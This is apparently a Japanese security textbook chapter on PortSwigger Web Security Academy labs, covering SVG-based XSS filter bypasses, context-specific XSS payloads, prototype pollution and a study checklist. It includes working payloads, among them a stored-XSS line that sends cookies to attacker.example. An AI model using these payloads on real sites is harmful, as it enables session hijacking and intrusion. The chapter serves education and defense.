# 第7章 ハンズオン ― PortSwigger Web Security Academy のラボと演習環境

## Web Security Academyとラボ環境

本節では、これまで学んできたXSS（Cross-Site Scripting）の理論を実際に手を動かして検証するための代表的な環境である、PortSwiggerの「Web Security Academy」を紹介する。反射型・格納型・DOM型といった基本分類や、CSP・sink（入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`）といった概念をすでに理解している読者を対象に、ここでは「どこで」「どう」実践演習を積むかという学習インフラの側面と、SVG（Scalable Vector Graphics。XML形式で図形を記述するマークアップ言語で、HTML内に埋め込むと一部のタグ・イベントがスクリプト実行の入口になり得る）を使った高度な回避テクニックを扱う。

### Web Security Academyとは何か

> ⚠️ **未取得の資料**: 「Web Security Academy トップページ」は自動取得できませんでした（理由: このセッションのegressプロキシが `portswigger.net` ドメインへのアクセスを一律にブロックしているため、WebFetchが `EGRESS_BLOCKED` エラーで失敗）。以下のURLからユーザーご自身で直接ご覧ください: https://portswigger.net/web-security

（以下は未取得資料の補足として一般知識に基づく解説です）

Web Security Academyは、Burp Suiteの開発元であるPortSwigger社が無償で提供しているWebアプリケーションセキュリティの学習プラットフォームである。特徴は次の3点に整理できる。

1. **体系的なトピック分類**: XSS、SQLインジェクション、CSRF、SSRF、プロトタイプ汚染、CORSの誤設定、リクエストスマグリングなど、脆弱性クラスごとにトピックページが用意されている。各トピックページには「そもそもその脆弱性クラスがどう成立するか」という原理解説（sink・source・エンコーディング文脈の違いなど）と、実際に攻撃を仕掛けて突破する「ラボ（lab）」への導線がセットになっている。
2. **実際に動くインスタンス**: 各ラボは、ボタン一つで自分専用のインスタンス（脆弱なWebアプリケーションのクローン）を起動できる。読者がPOCペイロードを実際に投げて、ブラウザ上でアラートダイアログが出た/クッキーが盗めた、といった「攻撃が成立した」ことを機械的に判定してくれる（多くのラボは「lab is solved」というバナー表示で成功を通知する）。これにより、教科書を読むだけでは得られない「本当にそのペイロードが通るか」「WAFやサニタイザがどこで詰まるか」を体感できる。
3. **難易度の段階付け**: 各ラボには「APPRENTICE（見習い）」「PRACTITIONER（実践者）」「EXPERT（達人）」という3段階の難易度ラベルが付与されている。XSSのカテゴリで言えば、単純な反射型XSS（`<script>alert(1)</script>`がそのまま通るようなもの）はAPPRENTICEに分類され、CSPバイパスやサニタイザの正規表現の穴を突くようなものはPRACTITIONERやEXPERTに分類される。読者は自分の理解度に応じてラボを選び、段階的にスキルを積み上げられる。

Web Security Academyのコンテンツは、PortSwiggerの研究者（Gareth Heyes、James Kettleなど）が実際のバグバウンティやペネトレーションテストで発見した実戦的なテクニックを反映して継続的に更新されている点も特徴である。そのため、教科書的な知識だけでなく「実際の防御機構（WAF、サニタイザライブラリ、ブラウザのHTMLパーサの挙動）がどのように破られるか」という最新の攻防を学べる。

> 出典: Web Security Academy: Free Online Training from PortSwigger — https://portswigger.net/web-security

### 全ラボ一覧（all-labs）の使い方

> ⚠️ **未取得の資料**: 「All labs一覧ページ」は自動取得できませんでした（理由: 同上のegressプロキシによる `portswigger.net` ドメインのブロック）。以下のURLからユーザーご自身で直接ご覧ください: https://portswigger.net/web-security/all-labs

（以下は未取得資料の補足として一般知識に基づく解説です）

`all-labs` ページは、Web Security Academyに存在する全ラボ（数百本規模）を一枚のインデックスとして一覧化したものである。トピック別ページを一つずつ巡回する代わりに、このページから次のような使い方ができる。

- **横断検索**: 「XSS」「CSP」「DOM」といったキーワードで全カテゴリを横断してラボを絞り込める。たとえば「反射型XSSでSVGに関するもの」「格納型XSSでCSPバイパスを伴うもの」のように、複数のトピックにまたがる複合的なラボを探す際に有用である。
- **進捗管理**: PortSwiggerアカウントでログインした状態でラボを解くと、このページ上で解答済み（Solved）のラボにチェックマークが付く。体系的に「XSSカテゴリを全部解く」「難易度APPRENTICEを全部解く」といった学習計画を立てる際の進捗トラッカーとして機能する。
- **カテゴリ横断の関連性の把握**: 一覧を俯瞰すると、XSSのラボがCSP・CORS・クリックジャッキングなど他カテゴリのラボと組み合わさって「複合脆弱性」を形成しているケースが分かる。たとえば「reflected XSS into HTML context with most tags and attributes blocked」のようなラボ名から、単なる文脈だけでなく「どのタグ/属性がブロックされているか」という制約条件までタイトルから読み取れるよう設計されている。

実務上のTipsとして、初中級者はまず「Cross-site scripting」トピックのAPPRENTICEラボから着手し、「文脈（コンテキスト）ごとの脱出方法」を体で覚えたのち、PRACTITIONER以降でフィルタ回避・サニタイザ回避・CSPバイパスといった高度なテーマに進むのが効率的である。全ラボ一覧はその学習ロードマップを俯瞰的に設計するための地図として機能する。

> 出典: All labs | Web Security Academy — https://portswigger.net/web-security/all-labs

### 実践ラボ: SVGマークアップが一部許可された反射型XSS

このラボ（Reflected XSS with some SVG markup allowed）は、開発者が「XSSを防ぐために危険なタグ・イベント属性をブロックリスト（denylist）でフィルタする」という対策を取った際に、なぜそれが不十分になり得るかを体感させる教材である。

#### 前提となる状況

対象アプリケーションには検索機能があり、入力した検索語がそのままページのHTML内に反映される（典型的な反射型XSSの脆弱性ポイント）。開発者は`<script>`タグや`onerror`、`onload`といった代表的な危険イベントハンドラをサーバー側でブロックリスト方式で除去している。つまり、単純な

```html
<img src=x onerror=alert(1)>
```

のようなペイロードは、`onerror`という文字列自体が検出されて除去されるか、リクエストが拒否されてしまう。

#### なぜSVGが抜け道になるのか（仕組みレベルの説明）

ブロックリスト型のフィルタは「既知の危険な文字列パターン」を列挙して弾く方式であるため、本質的に「列挙されていないが危険なもの」を見逃す構造的欠陥を持つ。SVGはHTML5仕様上、HTML文書に直接埋め込める（インラインSVG）XML名前空間の要素群であり、通常のHTMLタグとは異なる独自のタグ・属性・イベントモデルを持つ。多くのフィルタは`onerror`、`onload`、`onclick`のようなHTML標準のグローバルイベントハンドラは検知対象に含めていても、SVG固有のアニメーション要素が持つイベント属性まではブロックリストに含めていないことが多い。

このラボで鍵となるのが`<animatetransform>`要素（SVGのSMILアニメーション機能の一部で、対象要素に回転・拡大縮小・移動などの変形アニメーションを適用する）が持つ`onbegin`イベント属性である。`onbegin`はアニメーションが開始されたタイミングで発火するイベントハンドラであり、ページの読み込み完了を待たずに、SVG要素がDOMに挿入されアニメーションが開始された瞬間に自動的に実行される。

つまり原理は次の通りである。

1. ブラウザのHTMLパーサは`<svg>`タグを認識すると、その内部をSVG/XML名前空間として解釈するモードに切り替える。
2. `<animatetransform>`はこの名前空間内で有効な要素であり、`onbegin`属性はそのイベントハンドラ属性として仕様上正当なものである。
3. サーバー側のフィルタが`onerror`や`onload`といった「HTMLの世界でよく使われる危険ワード」だけを見ていて、`onbegin`のようなSVGアニメーション固有のイベント名を想定していない場合、この属性はブロックリストをすり抜けて出力にそのまま残る。
4. ブラウザはSVGレンダリングエンジンの一部としてこのイベントハンドラをJavaScriptコンテキストとして評価するため、`onbegin`に書かれたコードがユーザーの操作なしに実行される。

これは「パーサ再解釈」の典型例であり、フィルタ実装者がHTMLの文法モデルだけを想定し、SVGという別の文法体系（XMLベースでイベント駆動アニメーションの独自仕様=SMILを持つ）が同じHTMLドキュメント内に混在できることを見落としたために生じる。防御側が想定する「攻撃面のメンタルモデル」と、ブラウザが実際にサポートする「解釈可能な文法の総体」との間にギャップがあると、そこが必ず攻撃の入口になるという、XSS対策全般に通じる重要な教訓がここに凝縮されている。

#### 実際のペイロード

最小構成のペイロードは次の通りである。

```html
<svg><animatetransform onbegin=alert(1) attributeName=x></svg>
```

このペイロードが動く理由を一文で言えば、「`<svg>`によってブラウザのパーサがSVG/XML解釈モードへ切り替わり、その中の`<animatetransform>`要素に付与された`onbegin`イベント属性は、フィルタのブロックリストに含まれる典型的なHTMLイベント名（`onerror`/`onload`など）ではないため検査を通過し、アニメーション開始と同時に`alert(1)`が実行されるから」である。

より実戦を模したフルペイロード例（実際に描画アニメーションを伴う形）は次のようになる。

```html
<svg width="120" height="120" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100" />
  <animateTransform attributeName="transform" attributeType="XML" type="rotate"
    from="0 60 70" to="360 60 70" dur="10s" repeatCount="indefinite" onbegin=alert(1337) />
</svg>
```

こちらは`<rect>`要素に対して回転アニメーションを実際に定義しつつ、そのアニメーションの`animateTransform`要素に`onbegin`ハンドラを仕込んでいる点で、より正規のSVGアニメーション記法に近い形になっており、構文検証が多少厳しいフィルタに対しても通りやすくなる場合がある。

#### 影響

このラボが示す影響は「反射型XSSの成立」であり、実際のシナリオでは以下のような被害につながり得る。

- 被害者のセッションクッキーの窃取（`document.cookie`の外部送信）
- 被害者のブラウザコンテキストでの任意操作（CSRFトークンの読み取り、フォームの自動送信など）
- フィッシングコンテンツの注入によるクレデンシャル窃取

反射型であるため、攻撃者は悪意あるURL（検索パラメータにこのSVGペイロードを含むもの）を被害者にクリックさせる必要がある点は、他の反射型XSSと同様である。

#### 防御策

このラボの教訓から導かれる防御策は次の通りである。

1. **ブロックリストではなくアローリスト（許可リスト）方式のサニタイズ**: DOMPurifyのような実績あるHTMLサニタイズライブラリを使い、許可するタグ・属性を明示的に列挙する方式に切り替える。ブロックリスト方式は「知られている攻撃パターン」しか防げず、SVGのような広大な仕様を持つマークアップ言語全体を把握しきることは現実的に不可能である。
2. **SVGアップロード/埋め込み自体を禁止するか、サニタイズ後にのみ許可**: ユーザー入力にSVGを許可する必要が本当にあるか設計段階で再検討し、必要な場合は`<script>`要素だけでなく、`on*`で始まるすべてのイベント属性（HTML標準・SVG固有を問わず）を除去する包括的な処理を行う。
3. **Content-Security-Policy（CSP）の併用**: 仮にHTMLインジェクションが成立しても、適切な`script-src`ディレクティブ（`'unsafe-inline'`を含まない）を設定していれば、インラインイベントハンドラによるスクリプト実行はブラウザ側でブロックされる。これは「多層防御」の考え方であり、単一のサニタイズ処理に依存しないことの重要性を示している。
4. **出力エンコーディングの徹底**: そもそもユーザー入力をHTMLとして解釈させる必要がない文脈（例えば検索語の表示）では、HTMLエンティティエンコード（`<`を`&lt;`に変換するなど）を行い、タグとして解釈される余地自体をなくすのが最も堅牢な対策である。

> 出典: Lab: Reflected XSS with some SVG markup allowed | Web Security Academy — https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed
> （本ラボの解法ペイロード部分は、PortSwigger本体ページへの直接アクセスがegressプロキシでブロックされたため、WebSearch経由で取得した複数の解法記事の要約情報を基に再構成した。参照した二次情報源: Write-up記事「Reflected XSS with Some SVG Markup Allowed」— https://medium.com/@mr-osama-mustafa/write-up-reflected-xss-with-some-svg-markup-allowed-from-portswigger-26a7d3f6cfe8 、および https://siunam321.github.io/ctf/portswigger-labs/Cross-Site-Scripting/xss-19/ ）

### まとめ

Web Security Academyは、XSSを含むWebセキュリティ全般を「読むだけ」で終わらせず、実際に攻撃を成立させることで理解を定着させるための最良の実践環境の一つである。全ラボ一覧を学習の地図として使い、難易度APPRENTICEから段階的にPRACTITIONER・EXPERTへと進むことで、体系的にスキルアップできる。今回取り上げたSVGラボは、「ブロックリスト型フィルタは、防御側が想定していない文法体系（この場合はSVG/SMILのイベントモデル）の存在によって必ず突破され得る」という、XSS対策設計における普遍的な原則を象徴する好例である。読者は実際に自分の手でこのラボを解き、`onbegin`のようなマイナーだが正当なイベント属性がなぜブラウザで実行されるのかを、パーサの名前空間切り替えという仕組みのレベルで理解しておくことが望ましい。

---

## ラボ攻略ライトアップとチェックリスト

本節では、PortSwigger Web Security Academy の代表的なラボ群（Apprentice級XSS全9問、Prototype Pollution全ラボ）の攻略パターンを整理し、最後に実務・CTFで使える学習チェックリストをまとめる。反射型の素朴な `<script>alert(1)</script>` は既知という前提で、各ラボが「なぜそのコンテキストでその形のペイロードが必要になるのか」という**構文解析（パーサ）の観点**を中心に解説する。

### 7-B-1. Apprentice級 XSSラボ全9問の攻略パターン

> ⚠️ **未取得の資料**: 「PortSwigger XSS Labs: A Complete Guide to All 9 Apprentice-Level Challenges」（Thanuj Dilshan Thilakarathne, Medium）は自動取得できませんでした（理由: 実行環境のegressプロキシが medium.com ドメインへのアクセスを一律ブロックしているため）。詳細な手順・スクリーンショット付きの解説は以下のURLからユーザーご自身で直接ご覧ください。
> https://medium.com/@thanujthilakarathne/portswigger-xss-labs-a-complete-guide-to-all-9-apprentice-level-challenges-6fba56da8635

（以下は未取得資料の補足として一般知識に基づく解説です。PortSwigger Academyの公開ラボ構成に基づき、9問の代表的な出題パターンを「壊れ方」の観点で整理する。）

Apprentice級のXSSラボは、**入力値が出力される「コンテキスト（文脈）」ごとに壊し方が異なる**ことを体系的に学ばせる設計になっている。ここでいうコンテキストとは、HTMLパーサ・属性値パーサ・JavaScriptパーサ・URLパーサなど、入力が最終的にどの構文解析器に渡されるかという分類である。

**① タグ本文への反射（HTMLコンテキスト）**

検索ボックスの入力がエスケープなしで `<h1>0 results for 'xxx'</h1>` のようにHTML本文へ差し込まれるケース。

```html
<script>alert(1)</script>
```
なぜ動くか: サーバーが `<` `>` を実体参照（`&lt;` `&gt;`）に変換していないため、ブラウザのHTMLパーサが入力をそのままタグとして解釈し、新しい `<script>` 要素を生成してしまう。

**② HTML属性値への反射（属性コンテキスト）**

`<input value="xxx">` のようにダブルクォート属性の中に入力が入るケース。`<` `>` はエンコードされていても、ダブルクォート `"` がエンコードされていないことが多い。

```html
"><svg onload=alert(1)>
```
なぜ動くか: 属性値パーサは `"` を見た時点でその属性値の終端とみなす。続く `>` でタグそのものを閉じ、新たに `<svg onload=...>` という別要素を開始させることで、属性の外に出て任意のタグ・イベントハンドラを注入できる。

**③ 属性から抜けられない場合のイベントハンドラ注入**

`<` `>` `"` は全てエンコードされるが、属性値自体は自由に書けるケース。

```html
" autofocus onfocus=alert(1) x="
```
なぜ動くか: タグを閉じずに、同じ `<input>` タグ内に新しい属性（`onfocus`）を追加する。`autofocus` 属性がページロード時に自動的にフォーカスを当てるため、ユーザー操作なしで `onfocus` イベントハンドラが発火する。

**④ `<script>` タグ内への文字列反射（JSコンテキスト）**

```html
<script>var searchTerm = 'xxx';</script>
```
のように既存のJS文字列リテラルの中に入力が入るケース。

```js
'-alert(1)-'
```
または
```js
';alert(1)//
```
なぜ動くか: JSパーサはシングルクォートで文字列の終端を認識する。`'-alert(1)-'` は「文字列を閉じる → 減算演算子として `alert(1)` を実行 → 再度文字列を開いて構文エラーを防ぐ」という式に変換される。セミコロン版は文を分割して新しい文として `alert(1)` を実行し、`//` で行末以降をコメントアウトして構文エラーを防ぐ。

**⑤ タグ属性の許可リスト（サニタイズ）を回避するケース**

`<script>` や `on*` イベント属性のみをブラックリスト的に除去するフィルタに対して、`<img src=1 onerror=alert(1)>` のような読み込み失敗イベントを使う。

```html
<img src=x onerror=alert(1)>
```
なぜ動くか: `src` に無効な値を与えると画像読み込みが失敗し、ブラウザは自動的に `onerror` ハンドラを発火させる。フィルタが `<script>` タグのみを検知対象にしていると、`<img>` 要素経由のイベントハンドラは素通りする。

**⑥ 特定タグ・属性のブラックリストを回避（タグ名の大文字小文字・改行差し込み）**

```html
<sCrIpT>alert(1)</sCrIpT>
```
なぜ動くか: HTMLのタグ名は大文字小文字を区別しない（case-insensitive）が、正規表現ベースの単純なフィルタは大文字小文字を区別してしまうことがあり、`<script>` の小文字固定パターンしか検出しない実装だと回避できる。

**⑦ Stored XSS（格納型）― コメント欄などに保存され、閲覧者側で発火**

```html
<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>
```
なぜ動くか: 入力がデータベースに保存され、他ユーザーがそのページを閲覧するたびにHTMLとして再解釈・実行される。攻撃者自身ではなく被害者のブラウザ・セッションで実行される点が反射型と異なり、影響範囲（不特定多数のセッションハイジャック）が大きい。

**⑧ イベントハンドラ属性が使えず、`javascript:` URLスキームを使うケース**

`<a href="xxx">click</a>` のように `href` 属性に入力が入るケース。

```html
javascript:alert(document.domain)
```
なぜ動くか: `javascript:` はURLスキームの一種として扱われるが、ブラウザはこのスキームをJavaScriptエンジンへの実行指示として特別扱いする。リンクがクリックされた際、通常のナビゲーションの代わりにスクリプトが実行される。

**⑨ DOM-based XSS ― `location.hash` を経由してjQueryのセレクタに渡されるケース**

投稿タイトルを `location.hash` から読み取り、`$('#'+hash)` のようにjQueryのセレクタとして渡してオートスクロールする実装。

```
https://vulnerable-site.com/#<img src=1 onerror=alert(1)>
```
なぜ動くか: jQueryの `$()` はセレクタ文字列がHTMLタグの形（`<`で始まる）と判定すると、CSSセレクタではなくDOM要素として**その場でHTML化して生成**する（jQueryの自動判別ロジック）。これにより `location.hash` というクライアント側のみで完結するsink（入力が最終的に実行・解釈される危険な代入先）に、任意のHTMLが注入される。サーバーを一切経由しないため、通信ログやWAFでは検知しにくい点が特徴。

> 出典: PortSwigger XSS Labs: A Complete Guide to All 9 Apprentice-Level Challenges — https://medium.com/@thanujthilakarathne/portswigger-xss-labs-a-complete-guide-to-all-9-apprentice-level-challenges-6fba56da8635 （本文取得不可のため見出し構成のみを参考に、内容は一般知識で再構成）

---

### 7-B-2. Prototype Pollution 全ラボのライトアップ

> ⚠️ **未取得の資料**: 「PortSwigger Labs: Prototype Pollution Writeup (All labs)」（awes0meness, Medium）は自動取得できませんでした（理由: 実行環境のegressプロキシが medium.com ドメインへのアクセスを一律ブロックしているため）。詳細な手順は以下のURLからユーザーご自身で直接ご覧ください。
> https://medium.com/@awes0me.writes/portswigger-labs-prototype-pollution-writeup-all-labs-9a2534bc8e07

（以下は未取得資料の補足として一般知識に基づく解説です。）

**プロトタイプ汚染（Prototype Pollution）とは何か**

JavaScriptのオブジェクトは、自身がプロパティを持たない場合、`__proto__` を通じてつながる**プロトタイプチェーン**を辿ってプロパティを探索する。攻撃者が `__proto__.foo = "bar"` のような形で `Object.prototype` そのものに任意のプロパティを追加できてしまうと、そのプログラム内であらゆるオブジェクトが `obj.foo` で `"bar"` を返すようになる。これは個別のオブジェクトのバグではなく、**言語の基盤となる共有オブジェクト（`Object.prototype`）を汚染する**ため、影響範囲がアプリケーション全体に及ぶ。

原因の典型例は、再帰的なオブジェクトのマージ・クローン処理（`lodash.merge`、`$.extend`、独自実装の `deepMerge` など）で、キー名に対する検証を行わずに代入していることにある。

```js
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
```
なぜ動くか: `source` のキーに `__proto__` という文字列を持たせると、`target[key]` は `target.__proto__`、すなわち `target` が参照するプロトタイプオブジェクト（多くの場合 `Object.prototype`）そのものを指す。ここに再帰的に代入が続くと、プロトタイプ自身に新しいプロパティが追加され、以後生成される**すべての通常オブジェクト**がそのプロパティを継承してしまう。

**クライアント側プロトタイプ汚染 → DOM XSS への昇格**

PortSwiggerの代表的なラボでは、URLのクエリパラメータをオブジェクトにパースするライブラリ（`jQuery.extend` 系）が汚染源（source）となり、その後スクリプトが `Object.prototype` から継承した特定のプロパティ（**gadget、汚染を実害に変換する経路**）を読み取って `<script src="...">` のURLを組み立てる。

```
/?__proto__[transport_url]=data:,alert(1);//
```
なぜ動くか: `__proto__[transport_url]` というクエリキーが `Object.prototype.transport_url` を汚染する。アプリのコードが `config.transport_url` を読み取って `<script src="' + config.transport_url + '/example.js">` のように動的にscriptタグを組み立てていると、汚染された値がそのままURLとして使われる。`data:` スキームはインラインでコンテンツを埋め込めるURLスキームであり、`data:,alert(1);` はMIMEタイプ省略時の既定として `text/plain` 相当のスクリプトソースを与える。末尾の `//` はアプリ側がハードコードしている `/example.js` という接尾辞を行コメントとして無効化する役割を持つ。

**サーバーサイド・プロトタイプ汚染（Node.js / Express）**

サーバー側でも同種のマージ処理（リクエストボディのJSONをconfigオブジェクトへマージするなど）があると、`Object.prototype` 経由で以下のようなgadgetを悪用できる：

- **サービス拒否（DoS）**: `Object.prototype.toString` のような組み込みメソッドを上書きし、内部処理で例外を発生させる。
- **リモートコード実行（RCE）**: 一部のテンプレートエンジンやシリアライズライブラリが、オブジェクトの `__proto__` 経由で汚染された設定値（例: `child_process` を呼び出す設定、テンプレートのコンパイルオプションなど）を信頼してしまうことで、任意コード実行に至るケースがある（例: pugやejsのようなテンプレートエンジンでのgadget悪用が典型例として知られる）。

**防御策**

1. `Object.create(null)` で**プロトタイプを持たないオブジェクト**を使い、汚染の踏み台自体を作らない。
2. `Object.freeze(Object.prototype)` により `Object.prototype` への書き込みそのものをエンジンレベルで禁止する。
3. マージ・パース処理で `__proto__` / `constructor` / `prototype` という文字列をキーとして拒否する（denylist）。
4. `Map` を辞書として使う（`Map` はプロトタイプチェーンを介した動的探索の対象にならないため、キー名衝突による汚染が原理的に起きない）。
5. 新しめのNode.js / npmライブラリでは `JSON.parse` の第二引数（reviver）でキー検証を行う、あるいは `Object.hasOwn()` で継承プロパティと自プロパティを明確に区別するといった対策も併用される。

> 出典: PortSwigger Labs: Prototype Pollution Writeup (All labs) — https://medium.com/@awes0me.writes/portswigger-labs-prototype-pollution-writeup-all-labs-9a2534bc8e07 （本文取得不可のため一般知識で再構成）

---

### 7-B-3. PortSwigger学習チェックリスト

> 出典: Portswigger_checklist (ashardian) — https://github.com/ashardian/Portswigger_checklist

このリポジトリはPortSwigger Web Security Academyの学習項目を体系的に列挙したチェックリストであり、XSSに限らず学習トピック全体（初級〜上級）を段階的に並べたロードマップとして構成されている。取得できた範囲では、XSS分野は「反射型 → 格納型 → DOM型 → フィルタバイパス」という順序で進めることが推奨されている。この構成に基づき、本教科書のここまでの内容と対応させた実務向けチェックリストを以下にまとめる。

**基礎コンテキストの特定**
- [ ] 入力がどの構文解析器（HTML本文 / 属性値 / JS文字列 / URL / CSS）に渡っているかを、ブラウザのDevToolsで実際のDOMを見て確認したか
- [ ] `<` `>` `"` `'` の4文字それぞれが個別にエンコードされているか、あるいは全く処理されていないかを切り分けたか

**反射型・格納型**
- [ ] 反射位置がHTMLコメント内・`<textarea>` 内・`<title>` 内など、通常のタグ挿入が効かない特殊要素の中でないか確認したか
- [ ] Stored XSSでは、入力した本人以外（管理者ビューなど権限の異なるユーザー）が閲覧するページまで波及していないか確認したか（管理者パネル閲覧によるセッションハイジャックは影響度が高い）

**DOM-based XSS**
- [ ] source（`location.hash` / `location.search` / `document.referrer` / `window.name` / `postMessage`）とsink（`innerHTML` / `document.write` / `eval` / jQueryの `$()` / `location` への代入）の組み合わせを洗い出したか
- [ ] jQueryなど、文字列の形からHTML/セレクタを自動判別するライブラリ特有の挙動を悪用できないか確認したか

**フィルタ・サニタイズ回避**
- [ ] タグ名・属性名の大文字小文字を変えて単純な文字列比較・正規表現フィルタを回避できないか
- [ ] `<script>` 以外のイベントハンドラ持ちタグ（`<img onerror>` `<svg onload>` `<body onload>` など）を試したか
- [ ] 二重エンコード・部分的なサニタイズ後の再結合（フィルタが一度しか置換処理をしないことで、ネストした文字列が復元されるケース）を試したか

**Prototype Pollution**
- [ ] クエリパラメータやJSONボディのキーとして `__proto__` `constructor.prototype` を送信し、レスポンスや後続の挙動に変化が出るか確認したか
- [ ] 汚染源（source）を見つけた後、実際に影響を及ぼすgadgetプロパティ（設定値・テンプレートオプションなど）をアプリのJSソースから探したか
- [ ] クライアント側の汚染をDOM XSSにまで昇格できる `<script src>` 組み立てロジックがないか確認したか

**CSP・その他の防御回避（発展）**
- [ ] CSP（Content-Security-Policy）のソース許可リストに、JSONPエンドポイントやオープンリダイレクトなど汎用のホワイトリストドメインが含まれていないか
- [ ] `nonce` ベースのCSPで、レスポンスヘッダーとHTML内nonce値の不一致・使い回しがないか

このチェックリストは網羅を目的とせず、「どの原理が働いているために攻撃が成立するか」を都度言語化しながら潰していくための骨組みとして使うことを推奨する。

---

（前章: [第6章 実例ライトアップ](./06-writeups.md)　｜　次章: [第8章 発展と防御](./08-frontier-defense.md)　｜　[目次](./README.md)）
